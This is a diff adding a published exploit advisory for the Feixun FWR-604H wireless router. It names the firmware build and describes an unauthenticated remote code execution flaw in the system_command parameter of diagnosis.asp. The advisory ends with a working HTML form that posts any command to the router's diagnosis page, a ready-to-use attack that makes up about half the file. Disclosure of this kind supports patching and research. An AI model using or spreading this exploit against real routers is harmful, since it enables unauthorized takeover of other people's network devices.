@@ -1,0 +1,27 @@
+# Exploit Title: [Feixun FWR-604H Wireless Router Remote Code Execution]
+# Date: [2014-01-09]
+# Exploit Author: [Arash Abedian
+(http://www.exploit-db.com/author/?a=6187<http://www.exploit-db.com/author/?a=6187)>
+)
+# Vendor Homepage: [http://feixun.com.cn]
+# Version: [Hardware Version 1.0, Firmware Build: 7642]
+# Tested on: [Hardware Version 1.0, Firmware Build: 7642]
+# Vulnerability Details:
+Feixun FWR-604H 150Mbps Wireless N Router is vulnerable to Remote Code
+Execution vulnerability(Hardware Version 1.0, Firmware Build: 7642, Vendor
+website:feixun.com.cn). The web server don't authenticate user prior to
+system level execution. As such an unauthenticated attacker can easily
+remotely exploit the target using system_command parameter in diagnosis.asp
+file.
+
+<html>
+<body>
+Exploit Feixun FWR-604H
+<FORM ACTION="http://192.168.1.1/diagnosis.asp" METHOD=POST>
+<input type="hidden" name="doType" value="2">
+Command: <input type="text" name="system_command">
+<input type="hidden" name="diagnosisResult" value="">
+<input type="submit" value="Exploit">
+</FORM>
+</body>
+</html>
